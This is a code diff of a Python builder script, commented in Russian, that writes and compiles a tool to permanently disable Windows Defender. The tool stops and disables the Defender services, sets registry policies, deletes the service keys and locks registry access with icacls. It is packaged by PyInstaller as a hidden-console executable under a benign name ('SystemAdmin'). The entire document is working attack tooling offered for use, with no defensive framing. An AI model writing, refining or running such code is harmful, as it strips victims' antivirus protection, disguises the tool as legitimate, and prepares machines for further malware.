@@ -29,33 +29,42 @@ if not run_as_admin():
 
 time.sleep(2)
 
-# Только самые важные команды которые точно работают
+# 1. БЛОКИРУЕМ ДОСТУП ЗАЩИТНИКА К РЕЕСТРУ
+subprocess.run('icacls "C:\\\\Windows\\\\System32\\\\config\\\\SOFTWARE" /deny *S-1-1-0:(DE)', shell=True)
+
+# 2. Устанавливаем настройки ДО блокировки
 commands = [
-    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
-    'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
-    'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
-    'powershell -Command "Add-MpPreference -ExclusionPath C:\\\\"',
     'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
+    'reg add "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
+    'reg add "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefend" /v "Start" /t REG_DWORD /d 4 /f',
     'sc stop WinDefend',
-    'sc config WinDefend start= disabled'
+    'sc config WinDefend start= disabled',
+    'sc stop WdNisSvc',
+    'sc config WdNisSvc start= disabled',
+    'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
+    'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"'
 ]
 
 for cmd in commands:
     try:
-        subprocess.run(cmd, shell=True, timeout=10)
-        time.sleep(1)
+        subprocess.run(cmd, shell=True, timeout=5)
+        time.sleep(0.5)
     except:
         pass
 
-print("Completed")
+# 3. УДАЛЯЕМ СЛУЖБУ ИЗ РЕЕСТРА ПОЛНОСТЬЮ
+subprocess.run('reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WinDefend" /f', shell=True)
+subprocess.run('reg delete "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\WdNisSvc" /f', shell=True)
+
+print("Defender permanently disabled")
 '''
 
-    with open('simple_defender_disable.py', 'w', encoding='utf-8') as f:
+    with open('perm_disable.py', 'w', encoding='utf-8') as f:
         f.write(disabler_code)
 
 def compile_to_exe():
-    os.system('pyinstaller --onefile --noconsole --name "WindowsTool" simple_defender_disable.py')
-    print("EXE создан: WindowsTool.exe")
+    os.system('pyinstaller --onefile --noconsole --name "SystemAdmin" perm_disable.py')
+    print("EXE создан: SystemAdmin.exe")
 
 if __name__ == "__main__":
     install_pyinstaller()
